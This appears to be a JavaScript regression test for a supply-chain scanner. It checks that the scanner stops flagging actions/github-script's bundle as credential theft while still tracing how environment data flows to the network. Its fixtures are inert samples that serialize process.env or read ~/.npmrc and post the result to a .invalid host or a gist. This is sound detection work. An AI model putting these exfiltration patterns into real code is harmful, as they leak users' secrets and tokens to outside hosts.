// FP-GITHUB-SCRIPT (0.1.9): the text follower, which reads a JavaScript text the supply-chain tree does not (one over
// 2,000,000 characters, as actions/github-script's 2.2 MB dist/index.js), keeps a variable a function declares and a
// callback's parameter to that function: actions/github-script@3a2844b was SC-IMPORT-RISK CRITICAL ("reads
// credentials or the whole environment and sends data over the network", `req.write(data, 'utf8')`) because
// @actions/exec's `result`, given a child process's environment, was read as TypeScript's `__importStar` helper's own
// `result`, and a child's stdout callback's `data` as @actions/http-client's. A name is narrowed only to a body whose
// end is certain, and a reading that met one of the follower's limits reports what the reading before finds too (the
// review of Oct 18: fp-github-script-review.test.js). Twin of python/tests/registry/test_fp_github_script.py and of
// the engine's flow_scope_tests.rs. Inert text only: nothing is executed; the addresses are .invalid.

import { test } from "node:test";
import assert from "node:assert/strict";
import { call, importTimeRisk } from "../src/lib/native.js";

const WHOLE = ["environment", "the whole environment", false];
const HARVEST = "reads credentials or the whole environment and sends data over the network";
// functions after which a text is a bundle's (longer than _LD_LONG: more than the follower's limits hold); statements
// after which it is as long and meets none of them; a comment that takes it past the tree's limit; called functions
// that fill the text's first _LD_MAX functions and calls
const LONG = Array.from({ length: 8000 }, (_, k) => `function f${k}(a) { return a + ${k}; }\n`).join("");
const PLAIN = "\n" + "void 0;\n".repeat(40000);
const PAST = "/*" + " pad".repeat(520000) + "*/\n";
const CALLED = Array.from({ length: 250 }, (_, k) => `function h${k}(a) { return a + ${k}; }\nh${k}(${k});\n`).join("");

const sent = (text) => {
  const got = call("local_data_sent_at", {}, text);
  return got === null ? null : got.slice(1);
};

// actions/github-script's bundle cut to the names that carried "the whole environment" to `req.write(data, "utf8")`
const GITHUB_SCRIPT = "var __importStar = (this && this.__importStar) || (function () {\n    return function (mod) {\n        if (mod && mod.__esModule) return mod;\n        var result = {};\n        if (mod != null) for (var k in mod) if (k !== \"default\") result[k] = mod[k];\n        return result;\n    };\n})();\nconst cp = __importStar(require(\"child_process\"));\nconst https = __importStar(require(\"https\"));\nclass ToolRunner {\n    exec() {\n        const child = cp.spawn(this.toolPath, this.args, this._getSpawnOptions(this.options));\n        child.stdout.on(\"data\", (data) => {\n            this.emit(\"stdline\", data);\n        });\n    }\n    _cloneExecOptions(options) {\n        options = options || {};\n        const result = {\n            cwd: options.cwd || process.cwd(),\n            env: options.env || process.env,\n            silent: options.silent || false\n        };\n        return result;\n    }\n}\nclass HttpClient {\n    putJson(requestUrl, obj, additionalHeaders = {}) {\n        return __awaiter(this, void 0, void 0, function* () {\n            const data = JSON.stringify(obj, null, 2);\n            const res = yield this.put(requestUrl, data, additionalHeaders);\n            return this._processResponse(res, this.requestOptions);\n        });\n    }\n    requestRawWithCallback(info, data, onResult) {\n        const req = info.httpModule.request(info.options, (msg) => {\n            onResult(undefined, msg);\n        });\n        if (data && typeof data === \"string\") {\n            req.write(data, \"utf8\");\n        }\n        req.end();\n    }\n    _processResponse(res, options) {\n        return __awaiter(this, void 0, void 0, function* () {\n            let obj;\n            let contents;\n            contents = yield res.readBody();\n            if (contents && contents.length > 0) {\n                obj = JSON.parse(contents);\n            }\n            return obj;\n        });\n    }\n}\n";
const GITHUB_SCRIPT_EXEC = GITHUB_SCRIPT.replace(
  "        const child = cp.spawn(this.toolPath, this.args, this._getSpawnOptions(this.options));",
  "        const optionsNonNull = this._cloneExecOptions(this.options);\n"
  + "        const child = cp.spawn(this.toolPath, this._getSpawnArgs(optionsNonNull), this._getSpawnOptions(this.options));");
const NOT_GIVEN = "const https = require('https');\nfunction a() {\n  const data = JSON.stringify(process.env);\n  console.log(data.length);\n  b('hello');\n}\nfunction b(data) {\n  const req = https.request({ host: 'c.invalid', method: 'POST' });\n  req.write(data);\n  req.end();\n}\na();\n";

const SENDS = {
  "a body": "async function main() {\n  await fetch('https://c.invalid/x', { method: 'POST', body: JSON.stringify(process.env) });\n}\nmain();\n",
  "a query of its entries": "const https = require('https');\nconst q = Object.entries(process.env).map(([k, v]) => k + '=' + encodeURIComponent(v)).join('&');\nhttps.get('https://c.invalid/x?' + q);\n",
  "copied into an object": "const https = require('https');\nfunction collect() {\n  const out = {};\n  for (const k of Object.keys(process.env)) out[k] = process.env[k];\n  return out;\n}\nconst body = JSON.stringify(collect());\nconst req = https.request({ hostname: 'c.invalid', method: 'POST' });\nreq.write(body);\nreq.end();\n",
  "spread and posted": "const axios = require('axios');\nasync function run() {\n  const payload = { ...process.env, at: Date.now() };\n  await axios.post('https://c.invalid/x', payload);\n}\nrun();\n",
  "a gist": "async function run() {\n  const body = JSON.stringify({ files: { 'e.json': { content: JSON.stringify(process.env) } } });\n  await fetch('https://api.github.com/gists', { method: 'POST', headers: { authorization: 'token ' + process.env.GITHUB_TOKEN }, body });\n}\nrun();\n",
  "an axios helper": "const axios = require('axios');\nfunction send(url, data) {\n  return axios.post(url, data);\n}\nfunction main() {\n  const env = process.env;\n  send('https://c.invalid/x', { env });\n}\nmain();\n",
  "a class's methods": "const https = require('https');\nclass Reporter {\n  collect() {\n    const result = { env: process.env, cwd: process.cwd() };\n    return result;\n  }\n  send() {\n    const data = JSON.stringify(this.collect());\n    const req = https.request({ host: 'c.invalid', method: 'POST' });\n    req.write(data, 'utf8');\n    req.end();\n  }\n}\nnew Reporter().send();\n",
  "a parameter of the same name": "const https = require('https');\nfunction a() {\n  const data = JSON.stringify(process.env);\n  b(data);\n}\nfunction b(data) {\n  const req = https.request({ host: 'c.invalid', method: 'POST' });\n  req.write(data);\n  req.end();\n}\na();\n",
  "a parameter of another name": "const https = require('https');\nfunction a() {\n  const snapshot = JSON.stringify(process.env);\n  b(snapshot);\n}\nfunction b(payload) {\n  const req = https.request({ host: 'c.invalid', method: 'POST' });\n  req.write(payload);\n  req.end();\n}\na();\n",
  "three helpers": "function collect() {\n  const all = Object.assign({}, process.env);\n  pack(all);\n}\nfunction pack(obj) {\n  const text = JSON.stringify(obj);\n  ship(text);\n}\nfunction ship(body) {\n  fetch('https://c.invalid/x', { method: 'POST', body: body });\n}\ncollect();\n",
  "a closure": "const https = require('https');\nfunction start() {\n  const blob = JSON.stringify(process.env);\n  setTimeout(() => {\n    const req = https.request({ host: 'c.invalid', method: 'POST' });\n    req.end(blob);\n  }, 0);\n}\nstart();\n",
  "a callback's parameter, to a helper": "const all = [process.env];\nall.forEach((e) => {\n  post(e);\n});\nfunction post(x) {\n  fetch('https://c.invalid/x', { method: 'POST', body: JSON.stringify(x) });\n}\n",
  "past a regular expression's brace": "function go(s) {\n  const e = JSON.stringify(process.env);\n  const t = s.replace(/}/g, '');\n  fetch('https://c.invalid/x', { method: 'POST', body: e + t });\n}\ngo('');\n",
  "past a template in a template": "function go(a) {\n  const e = JSON.stringify(process.env);\n  const t = `${a ? `}` : ''}`;\n  fetch('https://c.invalid/x', { method: 'POST', body: e + t });\n}\ngo(1);\n",
  "a method's parameter of the same name": "const https = require('https');\nclass R {\n  run() {\n    const data = JSON.stringify(process.env);\n    this.send(data);\n  }\n  send(data) {\n    const req = https.request({ host: 'c.invalid', method: 'POST' });\n    req.write(data);\n    req.end();\n  }\n}\nnew R().run();\n",
  "an instance's method's return": "class Stealer {\n  grab() {\n    const data = JSON.stringify(process.env);\n    return data;\n  }\n}\nconst s = new Stealer();\nconst data = s.grab();\nfetch('https://c.invalid/x', { method: 'POST', body: data });\n"
};
const NPMRC = "const fs = require('fs');\nconst os = require('os');\nfunction go() {\n  const t = fs.readFileSync(os.homedir() + '/.npmrc', 'utf8');\n  fetch('https://c.invalid/x', { method: 'POST', body: t });\n}\ngo();\n";

test("github-script's bundle: its helpers' names carry nothing", () => {
  assert.notEqual(GITHUB_SCRIPT_EXEC, GITHUB_SCRIPT);
  for (const [what, text] of [["github-script", GITHUB_SCRIPT], ["with exec's options", GITHUB_SCRIPT_EXEC],
    ["a parameter not given it", NOT_GIVEN]]) {
    assert.equal(sent(text), null, what);
    assert.equal(sent(text + PLAIN), null, what);
    assert.deepEqual(importTimeRisk(text + PAST, "js"), [[], null], what);
    // the filler's 8,000 functions are more than the follower keeps: what the reading before finds is reported
    assert.deepEqual(sent(text + LONG), WHOLE, `${what}: a text that meets a limit`);
  }
});

test("the whole environment sent is followed in every shape", () => {
  for (const [what, text] of Object.entries(SENDS)) {
    assert.deepEqual(sent(text), WHOLE, what);
    assert.deepEqual(sent(text + LONG), WHOLE, what);
    assert.deepEqual(sent(text + PLAIN), WHOLE, what);
  }
  for (const what of ["a body", "a gist", "a parameter of another name", "a callback's parameter, to a helper",
    "an instance's method's return"]) {
    assert.deepEqual(importTimeRisk(SENDS[what] + PAST, "js")[0], [HARVEST], what);
  }
  for (const what of ["a parameter of the same name", "a parameter of another name", "three helpers",
    "a callback's parameter, to a helper"]) {
    assert.deepEqual(sent(CALLED + SENDS[what] + LONG), WHOLE, `${what}, past the text's first functions and calls`);
  }
  for (const text of [NPMRC, NPMRC + LONG]) {
    const [kind, what, address] = sent(text);
    assert.deepEqual([kind, address], ["file", false]);
    assert.ok(what.includes(".npmrc"), what);
  }
  assert.deepEqual(importTimeRisk(NPMRC + PAST, "js")[0], [HARVEST]);
});

test("beside github-script's names, an exfiltration of its own is found at its line", () => {
  for (const what of ["a body", "a parameter of another name"]) {
    const [reasons, line] = importTimeRisk(GITHUB_SCRIPT + SENDS[what] + PAST, "js");
    assert.deepEqual(reasons, [HARVEST], what);
    assert.ok(line > GITHUB_SCRIPT.split("\n").length - 1, `${what}: ${line}`);
  }
});
